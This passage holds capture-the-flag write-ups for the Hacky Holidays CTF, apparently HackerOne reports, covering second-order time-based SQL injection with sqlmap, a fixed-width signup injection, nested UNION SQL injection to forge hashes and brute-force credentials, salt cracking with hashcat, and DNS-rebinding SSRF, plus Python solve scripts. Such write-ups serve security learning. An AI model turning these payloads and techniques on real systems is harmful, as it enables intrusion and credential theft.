9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?1
14Sec-Fetch-Dest: document
15Referer: https://hackyholidays.h1ctf.com/evil-quiz
16Accept-Encoding: gzip, deflate
17Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
18Cookie: session=7ef26002a6768edc128fa085f2097475
19
20name=%22+or+sleep%285%29
<image_42>
Here are command requests and output
Request
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score"
<image_43>
It was detected as a time-based SQL injection on the MySQL database.
Request
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" --dbs --exclude-sysdbs
<image_44>
Code 23 Bytes
1Information_schema
2quiz
Request
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" --tables -D quiz
Response
Code 383 Bytes
1Parameter: name (POST)
2    Type: time-based blind
3    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
4    Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
5---
6web server operating system: Linux Ubuntu
7web application technology: Nginx 1.18.0
8back-end DBMS: MySQL >= 5.0.12
9Database: quiz
10[2 tables]
11+-------+
12| admin |
13| quiz  |
14+-------+
Request
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" -T admin -D quiz --columns
Response
<image_45>
Code 516 Bytes
1Parameter: name (POST)
2    Type: time-based blind
3    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
4    Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
5---
6web server operating system: Linux Ubuntu
7web application technology: Nginx 1.18.0
8back-end DBMS: MySQL >= 5.0.12
9Database: quiz
10[2 tables]
11+-------+
12| admin |
13| quiz  |
14+-------+
15
16Database: quiz
17Table: admin
18[3 columns]
19+----------+
20| Column   |
21+----------+
22| id       |
23| password |
24| username |
25+----------+
26
For admin, we got columns as id, username, and password.
Final command will dump the information.
Request
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" -T admin -D quiz --dump
Response
<image_46>
Code 612 Bytes
1Parameter: name (POST)
2    Type: time-based blind
3    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
4    Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
5---
6web server operating system: Linux Ubuntu
7web application technology: Nginx 1.18.0
8back-end DBMS: MySQL >= 5.0.12
9Database: quiz
10[2 tables]
11+-------+
12| admin |
13| quiz  |
14+-------+
15
16Database: quiz
17Table: admin
18[1 entry]
19+----+----------+-------------------+
20| id | username | password          |
21+----+----------+-------------------+
22| 1  | admin    | S3creT_p4ssw0rd-$ |
23+----+----------+-------------------+
After 40 mins of sqlmap, I got username as "admin" and password as "S3creT_p4ssw0rd-$".
Next, I visited https://hackyholidays.h1ctf.com/evil-quiz/admin and logged in with the credentials and thus, got the access and the flag.
<image_47>
Code 58 Bytes
1Evil Quiz Admin
2flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
In this way, we got the flag, this ctf level was about SQL injection attack using second order and it was time-based.
Flag 9 - flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Day 10 - CTF level 10
On day 10, it was launched as "https://hackyholidays.h1ctf.com/signup-manager/" on the/apps area.
Visit the link and we get the workflow: There is an option of signup and sign-in function, and once we signin, we get to the user area.
<image_48>
<image_49>
In the above case, I've registered with username - "test" and password - "test" to see the output, and thus, as we can see there is nothing interesting over there, just a message which says:
We'll have a look into you and see if you're evil enough to join the grinch army!
At first, I did inspect element on https://hackyholidays.h1ctf.com/signup-manager/, and in the above first line of source-code, one line caught my eye.
Code 70 Bytes
1<!-- See README.md for assistance -->
2<!DOCTYPE html>
3<html lang="en">
That means there is a "README.md" file path over here. After visiting https://hackyholidays.h1ctf.com/signup-manager/README.md, got the following steps describe inside as follows:
Code 707 Bytes
1 SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5How to Install
6
71) Create a directory that you wish SignUp Manager to be installed into
8
92) Move signupmanager.zip into the new directory and unzip it.
10
113) For security move users.txt into a directory that cannot be read from website visitors
12
134) Update index.php with the location of your users.txt file
14
155) Edit the user and admin php files to display your hidden content
16
176) You can make anyone an admin by changing the last character in the users.txt file to a Y
18
197) Default login is admin / password
In the second step, there is a mention of the zip file as "signupmanager.zip ".
Thus, by visiting https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip, downloaded the zip file and extracted it:
Code 60 Bytes
1files list
2admin.php
3index.php
4README.md
5signup.php
6user.php
<image_50>
README.md was the same as mentioned in the above one.
In the REAMDE.md file, there is a point 6 which says:
6) You can make anyone an admin by changing the last character in the users.txt file to a Y.
It means if we write the value "Y" at the last in the users.txt file, we can be admin.
Let's look at the index.php function
Code 4.07 KiB
1<?php
2if( isset($_GET["logout"]) ){
3    setcookie('token',null,time()-3600);
4    header("Location: ".explode("?",$_SERVER["REQUEST_URI"])[0]);
5    exit();
6}
7function buildUsers(){
8    $users = array();
9    $users_txt = file_get_contents('users.txt');
10    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
11        if( strlen($user_str) == 113 ) {
12            $username = str_replace('#', '', substr($user_str, 0, 15));
13            $users[$username] = array(
14                'username' => $username,
15                'password' => str_replace('#', '', substr($user_str, 15, 32)),
16                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
17                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
18                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
19                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
20                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
21            );
22        }
23    }
24    return $users;
25}
26function addUser($username,$password,$age,$firstname,$lastname){
27    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
28    $line = '';
29    $line .= str_pad( $username,15,"#");
30    $line .= $password;
31    $line .= $random_hash;
32    $line .= str_pad( $age,3,"#");
33    $line .= str_pad( $firstname,15,"#");
34    $line .= str_pad( $lastname,15,"#");
35    $line .= 'N';
36    $line = substr($line,0,113);
37    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
38    return $random_hash;
39}
40$all_users = buildUsers();
41$page = 'signup.php';
42if( isset($_COOKIE["token"]) ){
43    foreach( $all_users as $u ){
44        if( $u["cookie"] === $_COOKIE["token"] ){
45            if( $u["admin"] ){
46                $page = 'admin.php';
47            }else{
48                $page = 'user.php';
49            }
50        }
51    }
52}
53if( $page == 'signup.php' ) {
54    $errors = array();
55    if (isset($_POST["action"])) {
56        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
57            if( isset($all_users[ $_POST["username"] ]) ){
58                $u = $all_users[ $_POST["username"] ];
59                if( md5($_POST["password"]) === $u["password"] ){
60                    setcookie('token', $u["cookie"], time() + 3600);
61                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
62                    exit();
63                }
64            }
65            $errors[] = 'Username and password combination not found';
66        }
67        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
68            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
69            if (strlen($username) < 3) {
70                $errors[] = 'Username must by at least 3 characters';
71            } else {
72                if (isset($all_users[$username])) {
73                    $errors[] = 'Username already exists';
74                }
75            }
76            $password = md5($_POST["password"]);
77            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
78            if (strlen($firstname) < 3) {
79                $errors[] = 'First name must by at least 3 characters';
80            }
81            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
82            if (strlen($lastname) < 3) {
83                $errors[] = 'Last name must by at least 3 characters';
84            }
85            if (!is_numeric($_POST["age"])) {
86                $errors[] = 'Age entered is invalid';
87            }
88            if (strlen($_POST["age"]) > 3) {
89                $errors[] = 'Age entered is too long';
90            }
91            $age = intval($_POST["age"]);
92            if (count($errors) === 0) {
93                $cookie = addUser($username, $password, $age, $firstname, $lastname);
94                setcookie('token', $cookie, time() + 3600);
95                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
96                exit();
97            }
98        }
99    }
100}
101include_once($page);
102
In the code, inside function buildUsers(), we can see there will be 113 characters that are being written inside users.txt file, and in 'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false), if 113 character will be Y inside users.txt file, then we can become admin.
Code 844 Bytes
1function buildUsers(){
2    $users = array();
3    $users_txt = file_get_contents('users.txt');
4    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
5        if( strlen($user_str) == 113 ) {
6            $username = str_replace('#', '', substr($user_str, 0, 15));
7            $users[$username] = array(
8                'username' => $username,
9                'password' => str_replace('#', '', substr($user_str, 15, 32)),
10                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
11                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
12                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
13                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
14                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
15            );
16        }
It means in order to exploit admin access, we have to somehow exploit the signup area. As the signup area was described inside
function addUser($username,$password,$age,$firstname,$lastname)
Inside function, we can see we've have to exploit last name with capital "Y" to get the access.
Code 372 Bytes
1$random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
2    $line = '';
3    $line .= str_pad( $username,15,"#");
4    $line .= $password;
5    $line .= $random_hash;
6    $line .= str_pad( $age,3,"#");
7    $line .= str_pad( $firstname,15,"#");
8    $line .= str_pad( $lastname,15,"#");
9    $line .= 'N';
10    $line = substr($line,0,113);
Thus, in order to fill up our users.txt for signup functionality, we have to fill up every input field with maximum lengths as well.
So, we can see, username - 15, age - 3 , firstname - 15, and password - 15.
Now, in the age area we can see the condition as
Code 101 Bytes
1if (strlen($_POST["age"]) > 3) {
2                $errors[] = 'Age entered is too long';
3            }
But in order to fill up further, we have to fill up more than 3 lengths inside the age area. Thus, in order to do that, we can use the power function as 1e2, 1e3,1e4, 1e5,1e6 etc
where 1e(n) = 1x10 to the power n, thus let's use 1e6 over here.
So, our final exploit will be in the signup area where we will insert maximum characters.
Request
Code 864 Bytes
1POST /signup-manager/ HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 122
5Cache-Control: max-age=0
6Upgrade-Insecure-Requests: 1
7Origin: https://hackyholidays.h1ctf.com
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?1
14Sec-Fetch-Dest: document
15Referer: https://hackyholidays.h1ctf.com/signup-manager/
16Accept-Encoding: gzip, deflate
17Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
18
19action=signup&username=kunalbrokunal12&password=kunalbrokunal12&age=1e6&firstname=kunalbrokunal12&lastname=YYYYYYYYYYYYYYY
Response
Code 290 Bytes
1HTTP/1.1 302 Found
2Server: nginx/1.18.0 (Ubuntu)
3Date: Thu, 31 Dec 2020 14:51:29 GMT
4Content-Type: text/html; charset=UTF-8
5Connection: close
6Set-Cookie: token=16e3f0dd617d5ce9dbdba2c5a1f11b2d; expires=Thu, 31-Dec-2020 15:51:29 GMT; Max-Age=3600
7Location: /signup-manager/
8Content-Length: 0
After logging in as username- kunalbrokunal12 and password - kunalbrokunal12, we get the flag as we've successfully written the users.txt with capital "Y" at the end.
<image_51>
Code 107 Bytes
1Admin Area
2flag{99309f0f-1752-44a5-af1e-a03e4150757d}
3
4You made it through, continue to your next task here
There is also a link for CTF level 11 inside the "here" parameter.
Flag 10 - flag{99309f0f-1752-44a5-af1e-a03e4150757d}
Day 11 -CTF level 11
After getting the link from CTF level 10 which is https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 from the "here" parameter.
We get the workflow as :
There are photos and albums area with different hash IDs and different payloads. There is also an option of login area inside the https://hackyholidays.h1ctf.com/attack-box/login.
<image_52>
A message is also displayed as We are currently developing an API, apologies for anything that doesn't work quite right.
Thus, it means there can be /api endpoint being used inside r3c0n_server_4fdk59. Thus, finally visiting https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api and we can see different response codes:
Request
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api
Response
Code 240 Bytes
1Grinch API Status Codes
2HTTP Status Code	Explanation
3200	Successful request with data returned
4204	Successful request but with no data found
5404	Invalid Endpoint
6400	Invalid GET/POST variable
7401	Unauthenticated Request or Invalid client IP
Also, if we visit any api endpoint like https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/aaa, it'll respond as:
{"error": "This endpoint cannot be visited from this IP address"}
Thus, we can't visit directly, this must be a case of an SSRF based exploit but need to find the right parameter.
In the image parameter for album such as https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=59grop
Image was loaded with base64 encoded parameter:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
<image_53>
Decoding the base64 parameter gives the output as:
{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}
So, I thought to insert api path for ssrf exploit inside the image , so tried the payload as:
Code 250 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/..\/api/","auth":"76ba061d356c6264a6005216e1776ba6"} --> encoded base64 parameter --->eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkvIiwiYXV0aCI6Ijc2YmEwNjFkMzU2YzYyNjRhNjAwNTIxNmUxNzc2YmE2In0=
And visited - https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkvIiwiYXV0aCI6Ijc2YmEwNjFkMzU2YzYyNjRhNjAwNTIxNmUxNzc2YmE2In0=
Response
invalid authentication hash
At this point, I was like how we can exploit the functionality, in order to do that, we have to generate a valid hash for the output.
So, I was being with no luck and then, visited hacker101 discord channel where adam posted a hint for "inception image".
After I tried SQL injection on album parameter to check whether it's a SQL injection case or not, however, it was:
Request
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%202,NULL,%22aaa%22--%20-
Response
In the response, it was returning the album column along with images.
<image_54>
It means select 2 means it was selecting album column and then, it struck about adam's inception hint.
In the movie inception, we get the dream inside a dream.
Thus, if we are selecting the album column and getting the output, thus there might be a chance of double SQL injection where we can select the photo id and if we somehow add the photo id as a random value, then it might generate valid auth hash from the server.
After different testing , finally got the double SQL injection.
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/\%22--%20-%22,NULL,%22aaa%27%22--%20-
Response
In response, we get the image as:
Code 268 Bytes
1 <div class="col-md-4">
2                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9">
3                    </div>
Request
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9
Base64decoded
{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"05a7e708a5f3da76506023047628829d"}
Response
Invalid content - type detected.
In the SQL injection, in the 3rd column inside SQL injection for column album, we successfully generate a valid hash for ../api/.
In the above response, for api, we get the response as the invalid content type detected. So, it means the server was accepting only content-type image and since the above /api parameter was of html type, the response was 200 but it was invalid content-type detected.
Based on that, I've tried to brute-force the api parameter, thinking about the common path.
In the workflow of the application, as we require username and password, thus common api paths can be such as api/config, api/users, api/user, api/username, etc.
In the above method, I tried api/config and load the picture in the response on firefox and it returned with:
Expected HTTP status 200, Received: 404
<image_55>
Thus as per the response says, it was returned with 404. Finally, after guessing the api as api/user on the above SQL payload as:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user/\%22--%20-%22,NULL,%22aaa%27%22--%20-
Response
<image_56>
Invalid content type detected
As api/user was valid, that means we've to find username and password out of this. In SQL database, when we try to find any character we use the % symbol in the back-end query.
Select * from users where username like 'a%'
At this concept, I tried to find the username char by char on the above api/user . thus, our final exploit will be
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?username=a%\%22--%20-%22,NULL,%22aaa%27%22--%20-
If the char will be valid for api/user?username=a%, it'll return with "invalid content type" otherwise "Expected HTTP status 200, Received: 204".
So, after bruteforcing for about 20 mins char by char, got the first char as "g " on username, returned with "invalid content-type".
For the second char, it'll be api/user?username=gr%. After final exploitation for char, got the username as grinchadmin.
Request
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?username=grinchadmin%\%22--%20-%22,NULL,%22aaa%27%22--%20-
<image_57>
Invalid-content type
Similarly, for the password, we can use /api/user?password=a%, after another 20 mins, got the password as "s4nt4sucks".
Request
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?password=s4nt4sucks%\%22--%20-%22,NULL,%22aaa%27%22--%20-
Response
<image_58>
Here are the credentials fetched using double SQL injection- username: grinchadmin, password: s4nt4sucks
After using the above credentials inside https://hackyholidays.h1ctf.com/attack-box/login, it was successfully returned with the flag area.
<image_59>
Code 71 Bytes
1Grinch Network Attack Server
2flag{07a03135-9778-4dee-a83c-7ec330728e72}
Finally, got the flag 11.
Flag 11- flag{07a03135-9778-4dee-a83c-7ec330728e72}.
Day12 - CTF level 12
Since I solved flag 11 on day 12, it was already loaded with the level as we can see in the screenshot.
Inside https://hackyholidays.h1ctf.com/attack-box, there were three target ips along with an attack option and once we click on the attack option, it'll trigger the payload.
Request
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
Decode the base64 payload
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
Response
Redirect to https://hackyholidays.h1ctf.com/attack-box/launch/7e9a25f63e3d1856373c36c9d3e29f89
<image_60>
As per flag 11, if we add random IP over here, it might say the error and I was right:
Code 177 Bytes
1{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}  ---> encode base64 --> eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
Request
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
Response
Invalid Protection Hash
So as this was the last flag, I didn't think that there might be another case of SQL injection. So, can we try to break the hash itself?
Maybe either it can be md5 encrypted or md5 hash salt encrypted.
For cracking the hash, one of the best tool is to use "Hashcat".
In order to crack the hash, we need 3 or more hashes inside hash file.
So, for target 203.0.113.33, 203.0.113.53 and 203.0.113.213, decoded the attack payload and got the 3 hashes that I've stored inside hashes file as:
Code 138 Bytes
15f2940d65ca4140cc18d0878bc398955:203.0.113.33
22814f9c7311a82f1b822585039f62607:203.0.113.53
35aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
We also need a wordlist, so I've downloaded the rockyou.txt file for this one.
Final command to crack using hashcat
hashcat -m 10 hashes rockyou.txt -O
hashcat -m 10 hashes rockyou.txt --show
<image_61>
Code 174 Bytes
15f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
22814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
35aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
Thus, we got salt as mrgrinch463.
As per the level, the grinch is trying to attack Santa's server. Thus, in order to stop the grinch, we need to perform an attack on the localhost or 127.0.0.1, then the grinch can be stopped.
Generating hash for 127.0.0.1 using salt mrgrinch463 and encrypt base64
Code 319 Bytes
1mrgrinch463127.0.0.1 -----> md5 salted ---> 3e3f8df1658372edf0214e202acb460b ----> use in the above format as {"target":"","hash":""} ----->
2
3{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"} ---> encrypt base64 --> eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
Our final payload in the url will be:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
Response
https://hackyholidays.h1ctf.com/attack-box/launch/1dabfbbbea602fefc21f33e24b399833
<image_62>
+Connection aborted, looks like localhost can't be attacked directly.
In the ssrf bypass for the above case (127.0.0.1), I've tried decimal, octal, and differents encoding, didn't worked, tried location header exploit didn't work.
So, I left my computer for a while and got an idea as this CTF was also organized by nahamsec, there might be a case of DNS rebinding attack. [As per Snapchat ssrf exploit which I've already seen]
To perform DNS rebinding attacks, I've gone through https://github.com/taviso/rbndr.
In the https://github.com/taviso/rbndr, there was a site as 7f000001.c0a80001.rbndr.us
Which it was configured with 127.0.0.1 and 192.168.0.1
finally encrypted with md5 hash salt
Code 311 Bytes
1mrgrinch463mrgrinch4637f000001.c0a80001.rbndr.us
2
3MD5 encrypted salt - de9d82d4ae9a61660701e7e1844ea643
4
5{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}
6
7base64 encode
8
9eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
So, our final payload will be:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
This payload can take 4 or 5 times to retry to get the final result. Response
After taking down the grinch network on localhost, it'll redirect to https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709
<image_63>
Code 196 Bytes
1
2
3Well done! You've taken down Grinch Networks and saved the holidays!
4
5flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
6
7Thanks for playing, we'd appreciate it if you could leave us some feedback here
8
Flag 12 - flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Finally, it was completed and grinch has been taken down.
DAY 1 - GRINCH EMOTIONS
<image_64>
After solving all the flags and taken down the grinch server.
DAY 12 - UPDATED GRINCH EMOTIONS
<image_65>
Credits
Yash sodha (https://mobile.twitter.com/y_sodha) - A great friend who gave me some hints while I got stuck into the rabbit holes.
Discord Channel of Hacker101 - channel #hacky-holidays - A great conversation between ctf master, mods, and members where they gave hints and discussed various topics related to hacky-holidays CTF.
Adam Langley (https://mobile.twitter.com/adamtlangley) - A great CTF creator who created the CTF levels with rising difficulties. Thanks, Adam for providing such CTF.
Nahamsec (https://mobile.twitter.com/NahamSec) - A great organizer for this CTF, provided this CTF to connect with hackerone and gave everyone an opportunity to find flags and get private invites on Hackerone Platform.
Thanks
Kunal
Impact
Completed all the challenges and stopped the grinch.



==================================================

Report File: 1069467.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

The following writeup will underline all the steps and tools used to solve the 12 challenges of the H1 Holidays CTF. The theme of the competition was the Grinch. How it is possible to read from the competition blog post https://www.hackerone.com/blog/12-days-hacky-holidays-ctf , the goal was to shut down the grinch network and save the Christmas. Let's get wired!
I attached a ZIP file containing all the wordlists and the Python scripts in the report.
Tools used:
For this competition, I made a large use of Burp Suite + Google Chrome, together with some custom Python3 scripts created for some of the challenges.
<image_0>
Challenge 1
In the first challenge (which was not yet a real challenge), it was necessary to browse the competition webpage (https://hackyholidays.h1ctf.com/). It appeared like the following:
<image_1>
Without any further indication, the first thing I decided to try was to perform a directory bruteforce to find interesting files (I used the Burp "Content Discovery"). After some seconds, I discovered that the robots.txt file was accessible on the web server.
<image_2>
The robots.txt file contained two important information.
The first flag - flag{48104912-28b0-494a-9995-a203d1e261e7}
The endpoint for the next challenge  - /s3cr3t-ar3a
The following Python script allows to gather the first flag
Code 286 Bytes
1#!/usr/bin/python3
2import requests
3import re
4
5if __name__ == "__main__":
6    print("[*] Challenge 1")
7    url = "https://hackyholidays.h1ctf.com:443/robots.txt"
8    r = requests.get(url)
9    r1 = re.findall(r"flag\{[\w-]+\}",r.text)
10    print("[*] Flag in robots.txt: {}".format(r1[0]))
Challenge 2
By navigating to the endpoint exposed in the first challenge, it was possible to access the second challenge.
https://hackyholidays.h1ctf.com/s3cr3t-ar3a
<image_3>
This was difficult to solve without a browser, because the flag was loaded inside the webpage through Javascript, as shown in the following image:
<image_4>
Flag: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
The following script makes use of selenium to load the webpage, execute the JS code and retrieve the flag
Code 352 Bytes
1#!/usr/bin/python3
2import requests
3from selenium import webdriver
4
5if __name__ == "__main__":
6    print("[*] Challenge 2")
7    url = "https://hackyholidays.h1ctf.com/s3cr3t-ar3a"
8    driver = webdriver.PhantomJS()
9    driver.get(url)
10    flag = driver.find_element_by_id(id_='alertbox').get_attribute("data-info")
11    print("[*] Flag: {}".format(flag))
Challenge 3
The third challenge was accessible by browsing https://hackyholidays.h1ctf.com/people-rater. What appeared on the webpage was a list of "people buttons" that when clicked triggered an alert on the screen.
<image_5>
The alert was the result of a call to https://hackyholidays.h1ctf.com/people-rater/entry?id=PAYLOAD , where PAYLOAD was the a base64 encoded value.
<image_6>
Decoding the value from base64, I got a JSON string containing an "id".
<image_7>
I noticed that none of the users listed on the webpage had "id" equals to 1. I crafted a request with the value {"id":1} base64 encoded.
<image_8>
And then the flag was returned by the server.
<image_9>
Flag: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
As already done for the previous challenges, following a script which exploits the challenge3
Code 397 Bytes
1#!/usr/bin/python3
2import requests
3import base64
4import json
5
6if __name__ == "__main__":
7    print("[*] Challenge 3")
8    payload = json.dumps({"id": "1"})
9    base64 = base64.b64encode(payload.encode("utf-8"))
10    url = "https://hackyholidays.h1ctf.com/people-rater/entry?id={}".format(base64.decode('utf-8'))
11    r = requests.get(url)
12    j = r.json()
13    print("[*] Flag: {}".format(j["flag"]))
Challenge 4
The fourth challenge was accessible by browsing https://hackyholidays.h1ctf.com/swag-shop . The relative webpage contained some items of a shop.
<image_10>
This challenge took me some time. First, I inspected the source code and discovered that some HTTP requests where made to various /api/* endpoints.
<image_11>
I tried to perform a file bruteforce with Burp "Content Discover" on the /api endpoint using a custom wordlist (attached in the report).  The following endpoints were discovered:
<image_12>
/api/sessions returned a list of base64 encoded values.
<image_13>
Decoding the values, I noticed that one of them contained an UUID string as "user" property.
<image_14>
/api/user returned the following error message.
<image_15>
It was necessary to discover the right parameters  to call the API. I used again a custom wordlist and Burp Intruder to find the right parameter: uuid.
<image_16>
1+1 is 2, therefore I used the previously found UUID in the /api/user request and retrieved the fourth flag.
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
<image_17>
Flag: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
The following script exploits the challenge and retrieve the flag.
Code 670 Bytes
1#!/usr/bin/python3
2import requests
